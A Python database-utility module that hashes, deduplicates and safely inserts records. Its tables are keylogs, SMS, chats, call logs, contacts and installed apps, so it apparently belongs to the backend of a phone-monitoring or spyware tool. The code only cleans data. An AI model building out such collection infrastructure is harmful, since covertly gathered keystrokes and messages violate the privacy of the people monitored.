import hashlib
from sqlalchemy.exc import IntegrityError, SQLAlchemyError
from models import db, Chat, SMS, Calls, Contacts, InstalledApps, Keylogs
import logging
from typing import Tuple, Optional, Any

logger = logging.getLogger(__name__)

def generate_message_hash(message: str, timestamp: str) -> str:
    """Generate a unique hash for message content.
    
    Args:
        message: The message content to hash
        timestamp: Timestamp to include in the hash
        
    Returns:
        str: SHA-256 hash of the combined message and timestamp
    """
    content = f"{message}{timestamp}".encode('utf-8')
    return hashlib.sha256(content).hexdigest()

def deduplicate_messages(model: db.Model) -> int:
    """Remove duplicate messages from the specified model.
    
    Args:
        model: SQLAlchemy model class to deduplicate
        
    Returns:
        int: Number of duplicate records removed
        
    Raises:
        SQLAlchemyError: If database operations fail
    """
    try:
        # Find records with duplicate message_hash or text_hash
        hash_column = getattr(model, 'message_hash', None) or getattr(model, 'text_hash')
        
        duplicates = db.session.query(
            hash_column,
            db.func.min(model.id).label('keep_id'),
            db.func.array_agg(model.id).label('ids')
        ).group_by(hash_column)\
         .having(db.func.count(model.id) > 1)\
         .all()
        
        total_removed = 0
        for dup in duplicates:
            ids_to_remove = [id for id in dup.ids if id != dup.keep_id]
            if ids_to_remove:
                model.query.filter(model.id.in_(ids_to_remove)).delete(synchronize_session=False)
                total_removed += len(ids_to_remove)
        
        db.session.commit()
        logger.info(f"Successfully removed {total_removed} duplicate records from {model.__tablename__}")
        return total_removed
    
    except AttributeError as e:
        logger.error(f"Model {model.__tablename__} missing required hash column: {str(e)}")
        raise
    except SQLAlchemyError as e:
        db.session.rollback()
        logger.error(f"Database error during deduplication of {model.__tablename__}: {str(e)}")
        raise
    except Exception as e:
        db.session.rollback()
        logger.error(f"Unexpected error during deduplication of {model.__tablename__}: {str(e)}")
        raise

def safe_insert_record(record: db.Model) -> Tuple[bool, Optional[str]]:
    """Safely insert a record with proper error handling for duplicates.
    
    Args:
        record: SQLAlchemy model instance to insert
        
    Returns:
        Tuple containing:
            bool: True if insert successful, False otherwise
            Optional[str]: Error message if insert failed, None if successful
    """
    try:
        db.session.add(record)
        db.session.commit()
        logger.info(f"Successfully inserted record into {record.__class__.__tablename__}")
        return True, None
    
    except IntegrityError as e:
        db.session.rollback()
        if "duplicate key value violates unique constraint" in str(e):
            logger.warning(f"Duplicate record detected in {record.__class__.__tablename__}")
            return False, "Duplicate record detected"
        logger.error(f"Database integrity error in {record.__class__.__tablename__}: {str(e)}")
        return False, "Database integrity error"
    
    except SQLAlchemyError as e:
        db.session.rollback()
        logger.error(f"Database error while inserting into {record.__class__.__tablename__}: {str(e)}")
        return False, str(e)
    
    except Exception as e:
        db.session.rollback()
        logger.error(f"Unexpected error while inserting into {record.__class__.__tablename__}: {str(e)}")
        return False, str(e)

def cleanup_database() -> int:
    """Run full database cleanup and deduplication.
    
    Returns:
        int: Total number of duplicate records removed
        
    Raises:
        SQLAlchemyError: If database operations fail
    """
    try:
        total_cleaned = 0
        
        # Deduplicate messages in Chat, SMS, and Keylogs
        for model in [Chat, SMS, Keylogs]:
            try:
                total_cleaned += deduplicate_messages(model)
            except Exception as e:
                logger.error(f"Failed to deduplicate {model.__tablename__}: {str(e)}")
        
        # Remove duplicate contacts based on phone number
        duplicate_contacts = db.session.query(
            Contacts.phone,
            db.func.min(Contacts.id).label('keep_id'),
            db.func.array_agg(Contacts.id).label('ids')
        ).group_by(Contacts.phone)\
         .having(db.func.count(Contacts.id) > 1)\
         .all()
        
        for dup in duplicate_contacts:
            ids_to_remove = [id for id in dup.ids if id != dup.keep_id]
            if ids_to_remove:
                Contacts.query.filter(Contacts.id.in_(ids_to_remove)).delete(synchronize_session=False)
                total_cleaned += len(ids_to_remove)
        
        # Remove duplicate apps based on app_name
        duplicate_apps = db.session.query(
            InstalledApps.app_name,
            db.func.min(InstalledApps.id).label('keep_id'),
            db.func.array_agg(InstalledApps.id).label('ids')
        ).group_by(InstalledApps.app_name)\
         .having(db.func.count(InstalledApps.id) > 1)\
         .all()
        
        for dup in duplicate_apps:
            ids_to_remove = [id for id in dup.ids if id != dup.keep_id]
            if ids_to_remove:
                InstalledApps.query.filter(InstalledApps.id.in_(ids_to_remove)).delete(synchronize_session=False)
                total_cleaned += len(ids_to_remove)
        
        db.session.commit()
        logger.info(f"Database cleanup completed. Total records cleaned: {total_cleaned}")
        return total_cleaned
    
    except SQLAlchemyError as e:
        db.session.rollback()
        logger.error(f"Database error during cleanup: {str(e)}")
        raise
    except Exception as e:
        db.session.rollback()
        logger.error(f"Unexpected error during cleanup: {str(e)}")
        raise
